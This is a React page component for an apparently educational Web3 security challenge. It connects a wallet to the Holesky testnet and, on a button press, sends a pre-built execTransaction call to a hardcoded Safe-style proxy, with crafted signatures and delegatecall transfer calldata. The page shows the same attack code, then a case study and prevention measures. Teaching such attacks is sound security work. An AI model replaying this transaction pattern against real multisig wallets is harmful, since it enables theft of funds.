'use client';

import { useState, useEffect, useRef } from 'react';
import { useLanguage } from '@/app/contexts/LanguageContext';
import { useAccount, useConnect, useDisconnect, useWriteContract } from 'wagmi';
import { injected } from 'wagmi/connectors';
import { holesky } from 'viem/chains';
import Image from 'next/image';
import ChallengeCompletionModal from '@/app/components/ChallengeCompletionModal';

const TARGET_ADDRESS = '0xdFf38933CC5f46aAe55CC1d9D454492Ae96C5cBa';
interface WalletError extends Error {
  code: number;
}
export default function SafeProxyAttack() {
  const { t } = useLanguage();
  const { address, isConnected, chainId } = useAccount();
  const { connectAsync } = useConnect();
  const { disconnect } = useDisconnect();
  const { writeContractAsync } = useWriteContract();

  const [simulationCompleted, setSimulationCompleted] = useState(false);
  const [targetAddressInput, setTargetAddressInput] = useState('');
  const [resultMessage, setResultMessage] = useState({ text: '', type: '' });
  const [showResult, setShowResult] = useState(false);
  const [showCompletionModal, setShowCompletionModal] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (isConnected && chainId !== holesky.id) {
      switchToHolesky();
    }
  }, [isConnected, chainId]);

  const connectWallet = async () => {
    try {
      await connectAsync({ connector: injected() });
    } catch (error) {
      console.error('Failed to connect wallet:', error);
    }
  };

  const switchToHolesky = async () => {
    try {
      if (typeof window.ethereum !== 'undefined') {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x4268' }], // Holesky chainId
        });
      }
    } catch (switchError: unknown) {
      // 類型守衛確保錯誤處理的類型安全
      if (
        switchError instanceof Error &&
        'code' in switchError &&
        (switchError as WalletError).code === 4902
      ) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x4268',
              chainName: 'Holesky Testnet',
              nativeCurrency: {
                name: 'ETH',
                symbol: 'ETH',
                decimals: 18
              },
              rpcUrls: ['https://ethereum-holesky.publicnode.com'],
              blockExplorerUrls: ['https://holesky.etherscan.io']
            }]
          });
        } catch (addError) {
          console.error('Failed to add Holesky network:', addError);
        }
      }

    }
  }


  const executeAttack = async () => {
    try {
      if (simulationCompleted) return;
      setSimulationCompleted(true);
      // Construct attack data
      const signatures = "0xd0afef78a52fd504479dc2af3dc401334762cbd05609c7ac18db9ec5abf4a07a5cc09fc86efd3489707b89b0c729faed616459189cb50084f208d03b201b001f1f";
      const data = "0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000";

      // Using wagmi's writeContract instead of ethers
      await writeContractAsync({
        address: TARGET_ADDRESS as `0x${string}`,
        abi: [{
          type: 'function',
          name: 'execTransaction',
          inputs: [
            { name: 'to', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'data', type: 'bytes' },
            { name: 'operation', type: 'uint8' },
            { name: 'safeTxGas', type: 'uint256' },
            { name: 'baseGas', type: 'uint256' },
            { name: 'gasPrice', type: 'uint256' },
            { name: 'gasToken', type: 'address' },
            { name: 'refundReceiver', type: 'address' },
            { name: 'signatures', type: 'bytes' }
          ],
          outputs: [{ type: 'bool' }],
          stateMutability: 'nonpayable'
        }],
        functionName: 'execTransaction',
        args: [
          TARGET_ADDRESS as `0x${string}`,
          0n,
          data as `0x${string}`,
          1,
          45746n,
          0n,
          0n,
          '0x0000000000000000000000000000000000000000' as `0x${string}`,
          '0x0000000000000000000000000000000000000000' as `0x${string}`,
          signatures as `0x${string}`
        ],
        chainId: holesky.id
      });


    } catch (error: unknown) {
      console.error('Attack simulation error:', error);
      if (error instanceof Error) {
        const isUserRejection =
          'code' in error ||
          error.message.toLowerCase().includes('user denied') ||
          error.message.toLowerCase().includes('user rejected');

        if (isUserRejection) {
          setSimulationCompleted(false);
        }
      }
    }
  };

  const checkAddress = async () => {
    const isCorrect = targetAddressInput === TARGET_ADDRESS;
    setShowResult(true);

    if (isCorrect) {
      setResultMessage({
        text: t.safeProxyAttack.result.success,
        type: 'success'
      });
      setShowCompletionModal(true);
      if (chatEndRef.current) {
        chatEndRef.current.scrollIntoView({ behavior: 'smooth' });
      }
    } else {
      setResultMessage({
        text: t.safeProxyAttack.result.error,
        type: 'error'
      });
    }
  };

  return (
    <>
      <div ref={chatEndRef} />
      {!showCompletionModal && (
        <div className="max-w-4xl mx-auto p-6">
          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold mb-4 challenge-title">{t.safeProxyAttack.title}</h1>
            <h2 className="text-xl mb-2 challenge-subtitle">{t.safeProxyAttack.subtitle}</h2>
            <h3 className="text-red-500 mb-4">{t.safeProxyAttack.warning}</h3>
          </div>

          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
            <h3 className="font-bold">{t.safeProxyAttack.warningTitle}</h3>
            <p>{t.safeProxyAttack.warningText}</p>
          </div>

          <div className="bg-white p-6 rounded-lg shadow-md mb-6">
            <h3 className="text-xl font-bold mt-6 mb-2">{t.safeProxyAttack.attackPrinciple.title}</h3>
            <ul className="list-disc pl-6 mb-4">
              {t.safeProxyAttack.attackPrinciple.steps.map((step, index) => (
                <li key={index}>{step}</li>
              ))}
            </ul>
          </div>

          <div className="bg-white p-6 rounded-lg shadow-md mb-6">
            <h3 className="text-xl font-bold mb-4">{t.safeProxyAttack.step1.title}</h3>
            <p className="mb-2">
              {t.safeProxyAttack.step1.networkStatus}{' '}
              <span className="font-medium">
                {isConnected ? (chainId === holesky.id ? 'Holesky Testnet' : t.safeProxyAttack.step1.wrongNetwork) : t.safeProxyAttack.step1.notConnected}
              </span>
            </p>
            <p className="mb-4">
              {t.safeProxyAttack.step1.walletStatus}{' '}
              <span className="font-mono">
                {isConnected ? `${address?.slice(0, 6)}...${address?.slice(-4)}` : t.safeProxyAttack.step1.notConnected}
              </span>
            </p>

            {/* {!isConnected ? (
              <button
                onClick={connectWallet}
                className="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 transition-colors"
              >
                {t.safeProxyAttack.step1.connectButton}
              </button>
            ) : (
              <button
                onClick={() => disconnect()}
                className="px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600 transition-colors"
              >
                {t.safeProxyAttack.step1.disconnectButton}
              </button>
            )} */}
          </div>

          {isConnected && (
            <>
              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <h3 className="text-xl font-bold mb-4">{t.safeProxyAttack.attackTips.title}</h3>
                <p className="mb-4" dangerouslySetInnerHTML={{ __html: t.safeProxyAttack.attackTips.description }}></p>
                <div className="flex justify-center">
                  <Image
                    src="/images/poxy-attack-tips.png"
                    alt={t.safeProxyAttack.attackTips.imageAlt}
                    width={600}
                    height={400}
                    className="rounded-lg"
                  />
                </div>
              </div>

              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <h3 className="text-xl font-bold mb-4">{t.safeProxyAttack.step2.title}</h3>
                <pre className="bg-gray-100 p-4 rounded-lg mb-4 overflow-x-auto">
                  <code>
                    {`// 1. ${t.safeProxyAttack.step2.codeComment1}
const signatures =
"0xd0afef78a52fd504479dc2af3dc401334762cbd05609c7ac18db9ec5abf4a07a5cc09fc86efd3489707b89b0c729faed616459189cb50084f208d03b201b001f1f";

const data =
"0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000";

// 2. ${t.safeProxyAttack.step2.codeComment2}
await proxy.execTransaction(
  TARGET_ADDRESS,
  0,
  data,
  1,
  45746,
  0,
  0,
  "0x0000000000000000000000000000000000000000",
  "0x0000000000000000000000000000000000000000",
  signatures
);`}
                  </code>
                </pre>
                <button
                  onClick={executeAttack}
                  disabled={simulationCompleted}
                  className={`px-4 py-2 ${simulationCompleted ? 'bg-gray-400 cursor-not-allowed' : 'bg-blue-500 hover:bg-blue-600'} text-white rounded transition-colors`}
                >
                  {t.safeProxyAttack.step2.executeButton}
                </button>
              </div>

              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <h3 className="text-xl font-bold mb-4">{t.safeProxyAttack.step3.title}</h3>
                <div className="observation-task">
                  <h4 className="font-bold mb-2">{t.safeProxyAttack.step3.findTarget}</h4>
                  <p className="mb-2">{t.safeProxyAttack.step3.inputInstruction}</p>
                  <input
                    type="text"
                    value={targetAddressInput}
                    onChange={(e) => setTargetAddressInput(e.target.value)}
                    placeholder="0x..."
                    className="w-full p-2 border border-gray-300 rounded mb-4"
                  />
                  <button
                    onClick={checkAddress}
                    className="px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600 transition-colors"
                  >
                    {t.safeProxyAttack.step3.checkButton}
                  </button>
                </div>

                {showResult && (
                  <div className={`mt-4 p-4 rounded ${resultMessage.type === 'success' ? 'bg-green-50 text-green-700 border border-green-200' : 'bg-red-50 text-red-700 border border-red-200'}`}>
                    {resultMessage.text}
                  </div>
                )}

                {/* Show the case study, detailed explanation, and prevention measures after successful completion */}
                {showResult && resultMessage.type === 'success' && (
                  <div className="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                    {/* Case Study */}
                    <h3 className="text-xl font-bold mb-4">{t.safeProxyAttack.caseStudy.title}</h3>
                    <p className="mb-4" dangerouslySetInnerHTML={{ __html: t.safeProxyAttack.caseStudy.description }}></p>

                    <h4 className="font-bold mt-4 mb-2">{t.safeProxyAttack.caseStudy.analysisTitle}</h4>
                    <ul className="list-disc pl-6 mb-4">
                      {t.safeProxyAttack.caseStudy.analysis.map((item, index) => (
                        <li key={index}>{item}</li>
                      ))}
                    </ul>

                    <h4 className="font-bold mt-4 mb-2">{t.safeProxyAttack.caseStudy.toolTitle}</h4>
                    <p dangerouslySetInnerHTML={{ __html: t.safeProxyAttack.caseStudy.toolDescription }}></p>
                    <ul className="list-disc pl-6 mb-4">
                      {t.safeProxyAttack.caseStudy.toolSteps.map((step, index) => (
                        <li key={index}>{step}</li>
                      ))}
                    </ul>

                    {/* Detailed Attack Principle Explanation */}
                    <h3 className="text-xl font-bold mt-8 mb-4">{t.safeProxyAttack.attackPrinciple.title}</h3>

                    {/* Check if the detailed explanation exists before rendering */}
                    {'detailedExplanation' in t.safeProxyAttack.attackPrinciple && (
                      <div className="mt-2 mb-4" dangerouslySetInnerHTML={{ __html: (t.safeProxyAttack.attackPrinciple as any).detailedExplanation }}></div>
                    )}

                    {/* Check if technical details exist before rendering */}
                    {'technicalDetails' in t.safeProxyAttack.attackPrinciple && (
                      <div className="bg-white p-4 rounded-lg border border-gray-200 mb-6">
                        <ul className="list-disc pl-6 space-y-2">
                          {((t.safeProxyAttack.attackPrinciple as any).technicalDetails as string[]).map((detail: string, index: number) => (
                            <li key={index}>{detail}</li>
                          ))}
                        </ul>
                      </div>
                    )}

                    {/* Prevention Measures */}
                    <h3 className="text-xl font-bold mt-8 mb-4">{t.safeProxyAttack.prevention.title}</h3>
                    <ul className="list-disc pl-6 mb-4">
                      {t.safeProxyAttack.prevention.measures.map((measure, index) => (
                        <li key={index}>{measure}</li>
                      ))}
                    </ul>
                  </div>
                )}
              </div>
            </>
          )}
        </div>
      )}
      <ChallengeCompletionModal
        isOpen={showCompletionModal}
        onClose={() => setShowCompletionModal(false)}
        challengeKey="safe-proxy-attack"
        successContent={
          <div className="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
            {/* Case Study */}
            <h3 className="text-xl font-bold mb-4">{t.safeProxyAttack.caseStudy.title}</h3>
            <p className="mb-4" dangerouslySetInnerHTML={{ __html: t.safeProxyAttack.caseStudy.description }}></p>

            <h4 className="font-bold mt-4 mb-2">{t.safeProxyAttack.caseStudy.analysisTitle}</h4>
            <ul className="list-disc pl-6 mb-4">
              {t.safeProxyAttack.caseStudy.analysis.map((item, index) => (
                <li key={index}>{item}</li>
              ))}
            </ul>

            <h4 className="font-bold mt-4 mb-2">{t.safeProxyAttack.caseStudy.toolTitle}</h4>
            <p dangerouslySetInnerHTML={{ __html: t.safeProxyAttack.caseStudy.toolDescription }}></p>
            <ul className="list-disc pl-6 mb-4">
              {t.safeProxyAttack.caseStudy.toolSteps.map((step, index) => (
                <li key={index}>{step}</li>
              ))}
            </ul>

            {/* Detailed Attack Principle Explanation */}
            <h3 className="text-xl font-bold mt-8 mb-4">{t.safeProxyAttack.attackPrinciple.title}</h3>

            {/* Check if the detailed explanation exists before rendering */}
            {'detailedExplanation' in t.safeProxyAttack.attackPrinciple && (
              <div className="mt-2 mb-4" dangerouslySetInnerHTML={{ __html: (t.safeProxyAttack.attackPrinciple as any).detailedExplanation }}></div>
            )}

            {/* Check if technical details exist before rendering */}
            {'technicalDetails' in t.safeProxyAttack.attackPrinciple && (
              <div className="bg-white p-4 rounded-lg border border-gray-200 mb-6">
                <ul className="list-disc pl-6 space-y-2">
                  {((t.safeProxyAttack.attackPrinciple as any).technicalDetails as string[]).map((detail: string, index: number) => (
                    <li key={index}>{detail}</li>
                  ))}
                </ul>
              </div>
            )}

            {/* Prevention Measures */}
            <h3 className="text-xl font-bold mt-8 mb-4">{t.safeProxyAttack.prevention.title}</h3>
            <ul className="list-disc pl-6 mb-4">
              {t.safeProxyAttack.prevention.measures.map((measure, index) => (
                <li key={index}>{measure}</li>
              ))}
            </ul>
          </div>
        }
      />
    </>
  );
}
